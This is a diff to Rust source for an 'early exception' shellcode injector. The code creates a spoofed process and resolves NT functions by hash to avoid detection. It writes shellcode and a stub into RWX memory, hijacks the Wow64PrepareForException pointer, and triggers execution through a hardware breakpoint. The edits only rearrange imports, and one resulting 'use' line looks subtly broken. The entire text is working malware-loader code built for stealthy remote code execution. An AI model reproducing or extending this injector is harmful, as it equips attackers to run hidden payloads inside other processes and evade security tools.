@@ -1,4 +1,5 @@
 use std::ffi::c_void;
+use crate::ntapi::*;
 use windows_sys::Win32::System::Diagnostics::Debug::CONTEXT;
 use crate::syscall::common::env::get_loaded_module_by_hash;
 use crate::syscall::common::pe::get_export_by_hash;
@@ -27,22 +28,22 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     #[cfg(feature = "debug")]
     {
         crate::utils::print_message(&format!("[DEBUG] early_exception_inject target_program raw: '{}'", target_program));
-        match crate::api::normalize_nt_path(target_program.as_str()) {
+        match normalize_nt_path(target_program.as_str()) {
             Ok(p) => crate::utils::print_message(&format!("[DEBUG] early_exception_inject normalized nt path: '{}'", p)),
             Err(e) => crate::utils::print_message(&format!("[DEBUG] normalize_nt_path failed: {}", e)),
         }
     }
 
-    let process_info = crate::api::create_process_with_spoofing(target_program.as_str(), true)?;
+    let process_info = create_process_with_spoofing(target_program.as_str(), true)?;
 
     // Allocate memory for shellcode
-    use crate::api::PAGE_EXECUTE_READWRITE;
-    let shellcode_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;
+    use PAGE_EXECUTE_READWRITE;
+    let shellcode_addr = alloc_virtual_memory_at(process_info.hProcess, 0, shellcode_len, PAGE_EXECUTE_READWRITE)?;
 
     // Allocate memory for stub
     let mut stub_data = stub::get_stub();
     let stub_size = stub_data.len();
-    let stub_addr = crate::api::alloc_virtual_memory_at(process_info.hProcess, 0, stub_size, PAGE_EXECUTE_READWRITE)?;
+    let stub_addr = alloc_virtual_memory_at(process_info.hProcess, 0, stub_size, PAGE_EXECUTE_READWRITE)?;
     let nt_protect_addr = get_export_by_hash(ntdll, NT_PROTECT_HASH).ok_or("NtProtectVirtualMemory not found")?;
     
     // Patch stub
@@ -53,14 +54,14 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
 
     // Write shellcode
     let shellcode_slice = std::slice::from_raw_parts(shellcode_ptr as *const u8, shellcode_len);
-    crate::api::write_virtual_memory(process_info.hProcess, shellcode_addr, shellcode_slice)?;
+    write_virtual_memory(process_info.hProcess, shellcode_addr, shellcode_slice)?;
 
     // Write stub
-    crate::api::write_virtual_memory(process_info.hProcess, stub_addr, &stub_data)?;
+    write_virtual_memory(process_info.hProcess, stub_addr, &stub_data)?;
 
     // Overwrite Wow64PrepareForException pointer
     let stub_addr_bytes = (stub_addr as usize).to_le_bytes();
-    crate::api::write_virtual_memory(process_info.hProcess, wow64_prepare_for_exception as usize, &stub_addr_bytes)?;
+    write_virtual_memory(process_info.hProcess, wow64_prepare_for_exception as usize, &stub_addr_bytes)?;
 
     // Trigger exception via HWBP
     let nt_test_alert_addr = get_export_by_hash(ntdll, NT_TEST_ALERT_HASH).ok_or("NtTestAlert not found")?;
@@ -70,9 +71,9 @@ pub unsafe fn exec(shellcode_ptr: usize, shellcode_len: usize) -> Result<(), Str
     context.Dr0 = nt_test_alert_addr as u64;
     context.Dr7 = 0x00000001;
     
-    crate::api::set_context_thread(process_info.hThread, &context as *const _ as *const c_void)?;
+    set_context_thread(process_info.hThread, &context as *const _ as *const c_void)?;
 
-    crate::api::resume_thread(process_info.hThread)?;
+    resume_thread(process_info.hThread)?;
 
     Ok(())
 }
